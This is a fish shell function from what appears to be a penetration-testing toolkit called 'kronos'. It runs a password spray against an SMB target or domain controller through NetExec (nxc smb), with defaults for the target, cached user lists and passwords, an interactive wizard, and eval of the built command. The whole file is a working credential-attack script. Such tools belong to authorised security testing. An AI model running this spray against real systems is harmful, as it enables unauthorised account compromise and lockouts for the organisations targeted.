# description: Password spray using nxc smb
function __kronos_spray --description "Password spray using nxc smb"
    argparse h/help q/quiet u/userlist= p/password= X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos spray [TARGET] [OPTIONS]"
        echo ""
        echo "Password spray against a target using nxc smb."
        echo ""
        echo "Options:"
        echo "  -u, --userlist FILE Path to username list (defaults to valid_users.txt)"
        echo "  -p, --password PASS Password or path to password list to spray"
        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
        echo "  -q, --quiet         Skip prompts and use fallbacks"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    set -l userlist $_flag_userlist
    set -l password $_flag_password

    # Load defaults
    if test -z "$target"
        set target $__KRONOS_CACHE_SPRAY_TARGET
        if test -z "$target"; set target $TGT_HOSTS[1]; end
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end
    if test -z "$userlist"
        set userlist $__KRONOS_CACHE_SPRAY_USERLIST
        if test -z "$userlist"; set userlist "valid_users.txt"; end
    end
    if test -z "$password"
        set password $__KRONOS_CACHE_SPRAY_PASS
    end

    # Interactive Wizard
    if not set -q _flag_quiet
        if test (count $argv) -eq 0; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting Spray wizard..."; set_color normal

            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
            set -U __KRONOS_CACHE_SPRAY_TARGET "$target"

            set userlist (__kronos_ask "User List Path" "$userlist"); or return 1
            set -U __KRONOS_CACHE_SPRAY_USERLIST "$userlist"

            set password (__kronos_ask "Password (or wordlist path) to spray" "$password"); or return 1
            set -U __KRONOS_CACHE_SPRAY_PASS "$password"
        end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end
    if test -z "$password"; echo "error: password is required"; return 1; end

    if not test -f "$userlist"
        echo "error: userlist not found at $userlist." >&2
        return 1
    end

    set -l nxc_cmd "nxc smb \"$target\" -u \"$userlist\" -p \"$password\" --continue-on-success"
    if test -n "$TGT_DC_DOMAIN"
        set nxc_cmd "$nxc_cmd -d \"$TGT_DC_DOMAIN\""
    end

    if set -q _flag_edit_cmd
        set nxc_cmd (__kronos_edit_cmd "$nxc_cmd"); or return 1
    end

    __kronos_check_dep nxc; or return 1

    echo "[*] Running password spray against $target..."
    eval $nxc_cmd
end
